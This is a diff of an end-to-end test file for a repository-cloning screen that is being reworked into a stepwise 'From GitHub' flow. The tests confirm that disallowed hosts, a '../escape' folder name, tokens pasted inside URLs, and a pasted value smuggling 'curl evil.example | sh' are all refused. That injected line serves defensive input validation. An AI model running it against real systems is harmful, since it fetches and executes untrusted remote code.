@@ -26,6 +26,22 @@ const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=e2e', '-c', 
 const post = (request, url, data, headers) => request.post(`${API}${url}`, { data, headers });
 const fixtureUrl = (name) => `file://${path.join(FIXTURES, name)}`;
 
+/** "From GitHub" on the Open-a-project screen: the link, Next, "Is it private?", Next, and (under More options) the
+ * folder name and branch. Leaves the series on its last question ("Bring it in"). */
+async function answerGithub(page, { url, isPrivate = false, token, name, branch }) {
+  await page.goto('/?tab=github');
+  const panel = page.getByTestId('clone');
+  await panel.getByTestId('clone-url').fill(url);
+  await panel.getByTestId('clone-next').click();
+  await panel.getByTestId(isPrivate ? 'clone-private-yes' : 'clone-private-no').click();
+  if (token !== undefined) await panel.getByTestId('clone-token').fill(token);
+  await panel.getByTestId('clone-next').click();
+  if (name !== undefined || branch !== undefined) await panel.getByTestId('clone-more').locator('summary').click();
+  if (name !== undefined) await panel.getByTestId('clone-name').fill(name);
+  if (branch !== undefined) await panel.getByTestId('clone-branch').fill(branch);
+  return panel;
+}
+
 /** A bare repository in the fixtures directory: a Construct project (so it opens as one) plus, optionally, a big
  * incompressible file so the clone takes long enough to watch. */
 function makeFixture(name, { bigMb = 0 } = {}) {
@@ -97,32 +113,33 @@ test.describe.serial('#330 clone a repository', () => {
     fs.rmSync(path.join(SANDBOX, 'state'), { recursive: true, force: true });
   });
 
-  test('the Open-a-project screen offers Clone a repository, and a refused address is explained', async ({ page }) => {
+  test('the Open-a-project screen offers From GitHub, and a refused address is explained', async ({ page }) => {
     await page.goto('/');
+    await page.getByRole('tab', { name: 'From GitHub' }).click();
+    await expect(page).toHaveURL(/tab=github/);
     const panel = page.getByTestId('clone');
-    await expect(panel.getByRole('heading', { name: 'Clone a repository' })).toBeVisible();
-    await expect(panel.getByTestId('clone-start')).toBeDisabled();
+    await expect(panel.getByText('Paste the GitHub link')).toBeVisible();
+    await expect(panel.getByTestId('clone-next')).toBeDisabled();
     // Advice as you type, without blocking: the server decides. An ssh address is understood and converted.
     await panel.getByTestId('clone-url').fill('git@github.com:octocat/Hello-World.git');
     await expect(panel.getByTestId('clone-preview-url')).toHaveText('https://github.com/octocat/Hello-World.git');
     await panel.getByTestId('clone-url').fill('http://github.com/octocat/Hello-World');
     await expect(panel).toContainText('Use an https:// address');
-    await expect(panel.getByTestId('clone-start')).toBeDisabled();
-    // A well-formed https address on a host that is not allowed: the server refuses, in plain words.
-    await panel.getByTestId('clone-url').fill('https://evil.example/octocat/Hello-World');
+    await expect(panel.getByTestId('clone-next')).toBeDisabled();
+    // A well-formed https address on a host that is not allowed: the server refuses, in plain words, on the link question.
+    await answerGithub(page, { url: 'https://evil.example/octocat/Hello-World' });
     await panel.getByTestId('clone-start').click();
     await expect(panel.getByTestId('clone-error')).toContainText('not allowed');
+    await expect(panel.getByTestId('clone-url')).toBeVisible();
     expect(workspaceEntries()).toEqual(['local-only', 'not-a-repo', 'taken']);
     await panel.screenshot({ path: path.join(SHOTS, '330-1-clone-refused.png') });
   });
 
   test('cloning into a folder that already exists is refused and leaves it alone', async ({ page }) => {
-    await page.goto('/');
-    const panel = page.getByTestId('clone');
-    await panel.getByTestId('clone-url').fill(fixtureUrl('demo-app.git'));
-    await panel.getByTestId('clone-name').fill('taken');
+    const panel = await answerGithub(page, { url: fixtureUrl('demo-app.git'), name: 'taken' });
     await panel.getByTestId('clone-start').click();
     await expect(panel.getByTestId('clone-error')).toContainText('already exists');
+    await expect(panel.getByTestId('clone-name')).toBeVisible(); // on the question it belongs to
     expect(fs.readFileSync(path.join(WS, 'taken', 'keep.txt'), 'utf8')).toBe('mine');
   });
 
@@ -131,9 +148,7 @@ test.describe.serial('#330 clone a repository', () => {
       for (const vp of [{ width: 1280, height: 800 }, { width: 390, height: 800 }]) {
         await page.addInitScript((t) => localStorage.setItem('construct.theme', t), theme);
         await page.setViewportSize(vp);
-        await page.goto('/');
-        await expect(page.getByTestId('clone')).toBeVisible();
-        await page.getByTestId('clone-url').fill('https://evil.example/o/r');
+        await answerGithub(page, { url: 'https://evil.example/o/r' });
         await page.getByTestId('clone-start').click();
         await expect(page.getByTestId('clone-error')).toBeVisible();
         const found = (await runAxe(page)).filter(isBlocking);
@@ -143,9 +158,8 @@ test.describe.serial('#330 clone a repository', () => {
   });
 
   test('a clone shows progress, finishes, and opens the project with origin set to the address', async ({ page, request }) => {
-    await page.goto('/');
-    const panel = page.getByTestId('clone');
-    await panel.getByTestId('clone-url').fill(fixtureUrl('bulky-app.git'));
+    const panel = await answerGithub(page, { url: fixtureUrl('bulky-app.git') });
+    await expect(panel.getByTestId('clone-start')).toHaveText('Bring it in');
     await panel.getByTestId('clone-start').click();
     const state = panel.getByTestId('clone-state');
     // Progress is visible while it runs (the fixture is large enough to catch), then the project opens.
@@ -274,7 +288,7 @@ test.describe.serial('#330 clone a repository', () => {
 
   test('the one field understands what people paste, and shows the address, folder and branch before cloning', async ({ page, request }) => {
     await post(request, '/api/settings', { closeProject: true });
-    await page.goto('/');
+    await page.goto('/?tab=github');
     const panel = page.getByTestId('clone');
     const url = panel.getByTestId('clone-url');
     const HW = 'https://github.com/octocat/Hello-World.git';
@@ -292,13 +306,14 @@ test.describe.serial('#330 clone a repository', () => {
       await url.fill(typed);
       await expect(panel.getByTestId('clone-preview-url'), typed).toHaveText(want);
       await expect(panel.getByTestId('clone-preview-dest'), typed).toHaveText(`${WS}/Hello-World`);
-      await expect(panel.getByTestId('clone-branch'), typed).toHaveValue(branch);
-      await expect(panel.getByTestId('clone-start'), typed).toBeEnabled();
+      if (branch) await expect(panel.getByTestId('clone-preview-branch'), typed).toHaveText(branch);
+      else await expect(panel.getByTestId('clone-preview-branch'), typed).toHaveCount(0);
+      await expect(panel.getByTestId('clone-next'), typed).toBeEnabled();
     }
     await panel.screenshot({ path: path.join(SHOTS, '330-6-one-field-understood.png') });
     // The folder name can be changed (and the preview follows); a bad one is explained and blocks the button.
-    await url.fill('https://github.com/octocat/Hello-World/tree/develop');
-    await panel.getByTestId('clone-name').fill('my-copy');
+    await answerGithub(page, { url: 'https://github.com/octocat/Hello-World/tree/develop', name: 'my-copy' });
+    await expect(panel.getByTestId('clone-branch')).toHaveValue('develop');
     await expect(panel.getByTestId('clone-preview-dest')).toHaveText(`${WS}/my-copy`);
     await panel.getByTestId('clone-name').fill('../escape');
     await expect(panel).toContainText('A folder name may use letters');
@@ -307,18 +322,25 @@ test.describe.serial('#330 clone a repository', () => {
     // A branch typed by hand replaces the one read from the address.
     await panel.getByTestId('clone-branch').fill('release/1.0');
     await expect(panel.getByTestId('clone-preview-branch')).toHaveText('release/1.0');
-    // Things that must not go through are explained, with nothing echoed and the button off.
+    // Things that must not go through are explained, with nothing echoed and Next off.
+    await panel.getByTestId('clone-q-back').click();
+    await panel.getByTestId('clone-q-back').click();
     await url.fill('git clone $(curl evil.example | sh) https://github.com/o/r.git');
     await expect(panel).toContainText('one command');
     await expect(panel.getByTestId('clone-preview')).toHaveCount(0);
-    await expect(panel.getByTestId('clone-start')).toBeDisabled();
+    await expect(panel.getByTestId('clone-next')).toBeDisabled();
     await url.fill('https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/o/r');
     await expect(panel).toContainText('access token field');
-    await expect(panel.getByTestId('clone-start')).toBeDisabled();
+    await expect(panel.getByTestId('clone-next')).toBeDisabled();
     await url.fill('octocat/Hello-World');
+    await panel.getByTestId('clone-next').click();
+    // A token is asked for only when the project is private.
+    await panel.getByTestId('clone-private-no').click();
+    await expect(panel.getByTestId('clone-token')).toHaveCount(0);
+    await panel.getByTestId('clone-private-yes').click();
     await panel.getByTestId('clone-token').fill('two words');
     await expect(panel).toContainText('no spaces');
-    await expect(panel.getByTestId('clone-start')).toBeDisabled();
+    await expect(panel.getByTestId('clone-next')).toBeDisabled();
     // The token field is a password field with a plain-words guide to making a read-only token.
     await expect(panel.getByTestId('clone-token')).toHaveAttribute('type', 'password');
     await panel.getByTestId('clone-token-help').locator('summary').click();
@@ -331,10 +353,7 @@ test.describe.serial('#330 clone a repository', () => {
     const TOKEN = `github_pat_${crypto.randomBytes(24).toString('hex')}`;
     const seen = [];
     page.on('request', (r) => seen.push({ method: r.method(), url: r.url(), headers: JSON.stringify(r.headers()), body: r.postData() ?? '' }));
-    await page.goto('/');
-    const panel = page.getByTestId('clone');
-    await panel.getByTestId('clone-url').fill(fixtureUrl('secret-app.git'));
-    await panel.getByTestId('clone-token').fill(TOKEN);
+    const panel = await answerGithub(page, { url: fixtureUrl('secret-app.git'), isPrivate: true, token: TOKEN });
     await panel.getByTestId('clone-start').click();
     await expect(page.getByTestId('project-switcher')).toContainText('secret-app', { timeout: 30_000 });
     // On the wire: the token is in the POST body of /api/clone and in no URL and no header of any request.
@@ -366,9 +385,7 @@ test.describe.serial('#330 clone a repository', () => {
       startedAt: new Date().toISOString(), finishedAt: new Date().toISOString(), error: 'Private or misspelled — paste a token with read access.', code: 'AUTH', private: false, log: [],
     };
     await page.route('**/api/clone', (route) => (route.request().method() === 'POST' ? route.fulfill({ status: 202, contentType: 'application/json', body: JSON.stringify({ ok: true, job }) }) : route.continue()));
-    await page.goto('/');
-    const panel = page.getByTestId('clone');
-    await panel.getByTestId('clone-url').fill('octocat/private-thing');
+    const panel = await answerGithub(page, { url: 'octocat/private-thing' });
     await panel.getByTestId('clone-start').click();
     await expect(panel.getByTestId('clone-state')).toHaveText('Failed');
     await expect(panel.getByTestId('clone-progress')).toContainText('Private or misspelled — paste a token with read access.');
@@ -377,13 +394,11 @@ test.describe.serial('#330 clone a repository', () => {
 
   test('recent clones: Open, Pull latest (fast-forward only, says when nothing is new) and Remove from list', async ({ page, request }) => {
     await post(request, '/api/settings', { closeProject: true });
-    await page.goto('/');
-    const panel = page.getByTestId('clone');
-    await panel.getByTestId('clone-url').fill(fixtureUrl('second-app.git'));
+    const panel = await answerGithub(page, { url: fixtureUrl('second-app.git') });
     await panel.getByTestId('clone-start').click();
     await expect(page.getByTestId('project-switcher')).toContainText('second-app', { timeout: 30_000 });
     await post(request, '/api/settings', { closeProject: true });
-    await page.goto('/');
+    await page.goto('/?tab=github');
     const recent = page.getByTestId('clone-recent');
     const row = recent.getByTestId('clone-recent-row').filter({ hasText: 'second-app' });
     await expect(row).toBeVisible();
@@ -408,7 +423,7 @@ test.describe.serial('#330 clone a repository', () => {
     await expect(page.getByTestId('project-switcher')).toContainText('second-app', { timeout: 30_000 });
     // Remove from list forgets it on this browser only; the folder stays.
     await post(request, '/api/settings', { closeProject: true });
-    await page.goto('/');
+    await page.goto('/?tab=github');
     await page.getByTestId('clone-recent-row').filter({ hasText: 'second-app' }).getByTestId('clone-recent-forget').click();
     await expect(page.getByTestId('clone-recent-row').filter({ hasText: 'second-app' })).toHaveCount(0);
     expect(fs.existsSync(path.join(WS, 'second-app'))).toBe(true);
@@ -421,9 +436,12 @@ test.describe.serial('#330 clone a repository', () => {
       for (const vp of [{ width: 1280, height: 900 }, { width: 390, height: 900 }]) {
         await page.addInitScript(([t, e]) => { localStorage.setItem('construct.theme', t); localStorage.setItem('construct.clone.recent', JSON.stringify([e])); }, [theme, entry]);
         await page.setViewportSize(vp);
-        await page.goto('/');
+        await page.goto('/?tab=github');
         await page.getByTestId('clone-url').fill('https://github.com/octocat/Hello-World/tree/develop');
-        await expect(page.getByTestId('clone-preview')).toBeVisible();
+        await page.getByTestId('clone-preview').locator('summary').click();
+        await expect(page.getByTestId('clone-preview')).toContainText('Hello-World');
+        await page.getByTestId('clone-next').click();
+        await page.getByTestId('clone-private-yes').click();
         await page.getByTestId('clone-token-help').locator('summary').click();
         await expect(page.getByTestId('clone-recent')).toBeVisible();
         const found = (await runAxe(page)).filter(isBlocking);
